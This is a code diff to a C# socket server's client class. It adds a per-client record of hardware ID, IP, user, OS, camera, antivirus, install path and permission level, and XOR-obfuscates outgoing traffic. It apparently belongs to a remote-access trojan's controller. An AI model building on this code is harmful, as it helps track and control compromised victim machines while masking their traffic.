@@ -17,7 +17,24 @@ namespace Server
         private event ReadEventHandler Read;
         private delegate void ReadEventHandler(Clients client, byte[] data);
         private object SendSync { get; set; }
+        public bool IsControler { get; set; }
+        public ClientInfo Info { get; set; }
 
+        public class ClientInfo
+        {
+            public string HWID { get; set; }
+            public string IP;
+            public string User;
+            public string OS;
+            public bool Camera;
+            public int InstallType;
+            public string InstallTime;
+            public string Path;
+            public string Version;
+            public int Permission;
+            public string AV;
+            public string Group;
+        }
 
         public Clients(Socket CLIENT)
         {
@@ -25,9 +42,11 @@ namespace Server
             Buffer = new byte[1];
             Buffersize = 0;
             BufferRecevied = false;
+            IsControler = false;
             MS = new MemoryStream();
             Read += HandlePacket.Read;
             SendSync = new object();
+            Info = new ClientInfo();
             Client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
         }
 
@@ -117,7 +136,7 @@ namespace Server
                     {
                         using (MemoryStream MS = new MemoryStream())
                         {
-                            byte[] buffer = (byte[])Msgs;
+                            byte[] buffer = Helper.Xor((byte[])Msgs);
                             byte[] buffersize = Encoding.UTF8.GetBytes(buffer.Length.ToString() + Strings.ChrW(0));
                             MS.WriteAsync(buffersize, 0, buffersize.Length);
                             MS.WriteAsync(buffer, 0, buffer.Length);
@@ -133,6 +152,8 @@ namespace Server
                 }
             }
         }
+
+        
 
         public void EndSend(IAsyncResult ar)
         {
